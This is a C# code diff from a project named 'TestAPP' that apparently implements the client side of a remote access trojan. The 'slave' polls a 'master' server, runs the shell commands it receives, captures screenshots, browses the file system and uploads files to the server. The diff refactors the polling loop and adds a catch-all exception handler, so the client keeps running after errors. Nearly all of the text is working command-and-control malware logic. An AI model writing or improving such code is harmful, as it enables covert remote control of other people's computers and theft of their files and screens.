@@ -56,43 +56,55 @@ namespace TestAPP
             WebClient.sendPostJSON(Constants.API_SLAVE_FILEBROWSE_RESPONSE_URL, payload);
         }
 
-        static void obeyMaster(SystemInfo sysInfo)
+        static void connectToMaster(SystemInfo sysInfo)
         {
             JSONHolder json = new JSONHolder();
+            String commandJSON = getCommandJSONFromSysInfo(sysInfo);
+            Console.WriteLine("[+] Getting Command From Master...");
+            String serverResponse = WebClient.sendPostJSON(Constants.API_SLAVE_COMMAND_URL, commandJSON);
+            Console.WriteLine("Server Response is ");
+            Console.WriteLine(serverResponse);
+
+            if (serverResponse == "{}")
+            {
+                Console.WriteLine("[+] Nothing to do...");
+                System.Threading.Thread.Sleep(Constants.TIME_TO_WAIT_BETWEEN_COMMANDS_MILLISECONDS);
+                return;
+            }
+
+            Hashtable responseMap = json.getMappedObjectFromString(serverResponse);
+
+            switch (HashTableUtil.getStringFromVal(responseMap, Constants.SLAVE_COMMAND_KEY_TYPE))
+            {
+                case Constants.SLAVE_COMMAND_KEY_VALUE_SHELL:
+                    runShell(sysInfo, HashTableUtil.getStringFromVal(responseMap, Constants.SLAVE_COMMAND_KEY_COMMAND));
+                    break;
+                case Constants.SLAVE_COMMAND_KEY_VALUE_SCREENSHOT:
+                    getScreenShot(sysInfo, HashTableUtil.getStringFromVal(responseMap, Constants.SLAVE_COMMAND_KEY_COMMAND));
+                    break;
+                case Constants.SLAVE_COMMAND_KEY_VALUE_FILEBROWSE:
+                    browseFileSystem(sysInfo, HashTableUtil.getStringFromVal(responseMap, Constants.SLAVE_COMMAND_KEY_COMMAND));
+                    break;
+                case Constants.SLAVE_COMMAND_KEY_VALUE_FILEDOWNLOAD:
+                    uploadFileToMaster(sysInfo, HashTableUtil.getStringFromVal(responseMap, Constants.SLAVE_COMMAND_KEY_COMMAND));
+                    break;
+            }
+
+            System.Threading.Thread.Sleep(Constants.TIME_TO_WAIT_BETWEEN_COMMANDS_MILLISECONDS);
+        }
+        static void obeyMaster(SystemInfo sysInfo)
+        {
+            
             while (true)
             {
-                String commandJSON = getCommandJSONFromSysInfo(sysInfo);
-                Console.WriteLine("[+] Getting Command From Master...");
-                String serverResponse = WebClient.sendPostJSON(Constants.API_SLAVE_COMMAND_URL, commandJSON);
-                Console.WriteLine("Server Response is ");
-                Console.WriteLine(serverResponse);
-
-                if (serverResponse == "{}")
+                try
                 {
-                    Console.WriteLine("[+] Nothing to do...");
-                    System.Threading.Thread.Sleep(Constants.TIME_TO_WAIT_BETWEEN_COMMANDS_MILLISECONDS);
-                    continue;
+                    connectToMaster(sysInfo);
                 }
-
-                Hashtable responseMap = json.getMappedObjectFromString(serverResponse);
-
-                switch (HashTableUtil.getStringFromVal(responseMap, Constants.SLAVE_COMMAND_KEY_TYPE))
+                catch (Exception e)
                 {
-                    case Constants.SLAVE_COMMAND_KEY_VALUE_SHELL:
-                        runShell(sysInfo, HashTableUtil.getStringFromVal(responseMap, Constants.SLAVE_COMMAND_KEY_COMMAND));
-                        break;
-                    case Constants.SLAVE_COMMAND_KEY_VALUE_SCREENSHOT:
-                        getScreenShot(sysInfo, HashTableUtil.getStringFromVal(responseMap, Constants.SLAVE_COMMAND_KEY_COMMAND));
-                        break;
-                    case Constants.SLAVE_COMMAND_KEY_VALUE_FILEBROWSE:
-                        browseFileSystem(sysInfo, HashTableUtil.getStringFromVal(responseMap, Constants.SLAVE_COMMAND_KEY_COMMAND));
-                        break;
-                    case Constants.SLAVE_COMMAND_KEY_VALUE_FILEDOWNLOAD:
-                        uploadFileToMaster(sysInfo, HashTableUtil.getStringFromVal(responseMap, Constants.SLAVE_COMMAND_KEY_COMMAND));
-                        break;
                 }
-
-                System.Threading.Thread.Sleep(Constants.TIME_TO_WAIT_BETWEEN_COMMANDS_MILLISECONDS);
+                
             }
         }
     }
